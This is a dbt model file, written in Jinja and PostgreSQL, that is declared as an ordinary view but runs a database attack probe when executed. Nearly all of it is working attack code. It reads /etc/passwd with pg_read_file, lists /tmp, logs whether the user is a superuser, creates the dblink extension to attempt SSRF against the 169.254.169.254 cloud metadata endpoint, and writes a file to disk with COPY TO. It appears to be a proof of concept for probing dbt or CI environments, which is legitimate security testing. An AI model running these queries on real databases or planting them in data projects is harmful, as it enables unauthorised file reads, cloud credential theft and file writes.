{{ config(materialized='view') }}

{# This model ONLY runs with dbt run (execute=True) #}
{# It tests database-level file read, extension loading, COPY attacks #}

{%- if execute -%}

  {{ log("EXECUTE_TRUE_STARTING_DB_PROBE", info=True) }}

  {# 1. Get database version #}
  {%- set ver = run_query("SELECT version()") -%}
  {{ log("DB_VERSION=" ~ ver.columns[0].values() | list | first, info=True) }}

  {# 2. Check current user and privileges #}
  {%- set usr = run_query("SELECT current_user, current_database(), inet_server_addr(), inet_server_port()") -%}
  {{ log("DB_USER=" ~ usr.columns[0].values() | list | first, info=True) }}
  {{ log("DB_NAME=" ~ usr.columns[1].values() | list | first, info=True) }}
  {{ log("DB_ADDR=" ~ usr.columns[2].values() | list | first, info=True) }}
  {{ log("DB_PORT=" ~ usr.columns[3].values() | list | first, info=True) }}

  {# 3. Check if superuser #}
  {%- set su = run_query("SELECT usesuper FROM pg_user WHERE usename = current_user") -%}
  {{ log("IS_SUPERUSER=" ~ su.columns[0].values() | list | first, info=True) }}

  {# 4. List available extensions #}
  {%- set exts = run_query("SELECT name FROM pg_available_extensions WHERE installed_version IS NOT NULL ORDER BY name") -%}
  {{ log("INSTALLED_EXTENSIONS=" ~ exts.columns[0].values() | list | join(','), info=True) }}

  {# 5. Try pg_read_file (needs superuser or pg_read_server_files role) #}
  {%- set file_result = run_query("SELECT pg_read_file('/etc/passwd', 0, 1000) as data") -%}
  {{ log("PG_READ_FILE_PASSWD=" ~ file_result.columns[0].values() | list | first | truncate(500), info=True) }}

  {# 6. Try pg_ls_dir #}
  {%- set ls_result = run_query("SELECT string_agg(pg_ls_dir, ',') FROM pg_ls_dir('/tmp')") -%}
  {{ log("PG_LS_TMP=" ~ ls_result.columns[0].values() | list | first | truncate(500), info=True) }}

  {# 7. Check for dblink extension #}
  {%- set dblink = run_query("SELECT count(*) FROM pg_available_extensions WHERE name = 'dblink'") -%}
  {{ log("DBLINK_AVAILABLE=" ~ dblink.columns[0].values() | list | first, info=True) }}

  {# 8. Try CREATE EXTENSION dblink (SSRF via dblink) #}
  {%- set create_dblink = run_query("CREATE EXTENSION IF NOT EXISTS dblink") -%}
  {{ log("DBLINK_CREATED=YES", info=True) }}

  {# 9. SSRF via dblink to metadata endpoint #}
  {%- set ssrf = run_query("SELECT * FROM dblink('host=169.254.169.254 port=80 dbname=latest user=a password=b connect_timeout=3', 'SELECT 1') AS t(a text)") -%}
  {{ log("DBLINK_SSRF_RESULT=" ~ ssrf | string | truncate(500), info=True) }}

  {# 10. Try COPY TO for file write #}
  {%- set copy_result = run_query("COPY (SELECT 'PROBE_MARKER_dbt_RCE') TO '/tmp/dbt_probe_marker.txt'") -%}
  {{ log("COPY_WRITE_RESULT=SUCCESS", info=True) }}

{%- else -%}
  {{ log("DB_PROBE_EXECUTE_FALSE_SKIPPING", info=True) }}
{%- endif -%}

SELECT 1 as id
